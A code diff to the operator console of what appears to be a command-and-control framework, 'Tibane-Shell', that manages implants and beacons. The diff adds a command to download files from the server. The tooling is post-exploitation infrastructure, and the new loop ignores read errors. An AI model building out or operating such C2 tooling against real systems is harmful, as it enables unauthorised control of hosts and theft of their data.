@@ -12,6 +12,8 @@
 #include <readline/readline.h>
 #include <readline/history.h>
 #include <crypt.h>
+#include <sys/stat.h>
+#include <unistd.h>
 
 #include <openssl/evp.h>
 #include <openssl/x509v3.h>
@@ -52,7 +54,8 @@ const char tibane_shell_help[HELP_SIZE] = "\n[*] Tibane-Shell Usage [*]\n"
                                         "   beacon [id] : interactive shell for selected beacon\n"
                                         "   use [id] : same as beacon\n"
                                         "   upload [file path] : upload file to server\n"
-                                        "   quit, q, exit : exit the program\n"
+                                        "   quit, q, exit : exit the program\n" 
+                                        "   download [file_to_download] [path to store]\n"
                                         "   \n---------------------------------\n";
 
 const char beacon_shell_help[HELP_SIZE] = "\n[*] Tibane-shell (Beacon Usage) [*]\n\n"                              
@@ -224,16 +227,64 @@ class SendInfo : public Communicate_ {
         free(Sfilename);
 
         size_t bytesRead;
+        struct stat st;
+        fstat(file, &st);
+        size_t filesize = st.st_size;
+        SSL_write(ssl, &filesize, sizeof(filesize));
+        
         while ((bytesRead = read(file, contents, FILE_CHUNK)) > 0) {
             SSL_write(ssl, contents, bytesRead);
-            //send(sock, contents, bytesRead, 0);
-            //printf("%s\n", contents);
         }
         free(contents);
         return 0;
     }
 
-    int download() {
+    int download(const char* filename, const char* filepath) {
+        cJSON *info = cJSON_CreateObject();
+        if (!info) {
+            return -1;
+        }
+        int fd = open(filepath, O_WRONLY|O_CREAT|O_TRUNC, 0644);
+        if (fd == -1) {
+            return -1;
+        }
+        cJSON *file = cJSON_CreateObject();
+        if (!file) {
+            return -1;
+        }
+        cJSON_AddStringToObject(info, "Info", "files");
+        //cJSON_AddStringToObject(info, "folder", "operator");
+        cJSON_AddStringToObject(info, "option", "download");
+        char *info_ = cJSON_Print(info);
+        SSL_write(ssl, info_, strlen(info_));
+        free(info_);
+        cJSON_Delete(info);
+
+        cJSON_AddStringToObject(file, "file_name", filename);
+        char *file_ = cJSON_Print(file);
+        cJSON_Delete(file);
+        SSL_write(ssl, file_, strlen(file_));
+        free(file_);
+
+        printf("[+] Downloading file : %s\n", filename);
+        
+        // get filesize
+
+
+
+        char *contents =(char*)malloc(MAX_SIZE);
+        size_t bytesRead;
+        size_t filesize;
+        SSL_read(ssl, &filesize, sizeof(filesize));
+
+        size_t received = 0;
+        while (received < filesize) {
+            bytesRead = SSL_read(ssl, contents, FILE_CHUNK);
+            write(fd, contents, bytesRead);
+            received += bytesRead;
+        }
+        printf("[+] File stored at %s \n", filepath);
+        free(contents);
         return 0;
     }
 
@@ -748,7 +799,17 @@ void process_shell_command(const char* cmd, RetriveInfo recvinfo, SendInfo sendi
         if (sendinfo.upload(file_path) == -1) {
             printf("\n[-] Could Not Send File\n");
             return;
-        }  
+        }   
+    } else if (strncmp(cmd, "download", 8) == 0) {
+        char file_d[BUFFER_SIZE], file_store[BUFFER_SIZE];
+        if (sscanf(cmd, "download %s %s", file_d, file_store) != 2) {
+            printf("\n[-] use : download [file_to_download] [path to store]\n");
+            return;
+        }
+        if (sendinfo.download(file_d, file_store) == -1) {
+            printf("\n[-] Could not download file\n");
+            return;
+        }
     } else {
         printf("%s", tibane_shell_help);
     }
@@ -759,11 +820,9 @@ char** shell_completion(const char* text, int start, int end) {
     return rl_completion_matches(text, command_generator);
 }
 
-
-
 char* command_generator(const char* text, int state) {
     static const char* commands[] = {
-        "implants", "beacon", "list-tasks", "whoami", "upload", "exit", "quit", "q", "use", NULL
+        "implants", "beacon", "list-tasks", "whoami","download", "upload", "exit", "quit", "q", "use", NULL
     };
     
     static int list_index, len;
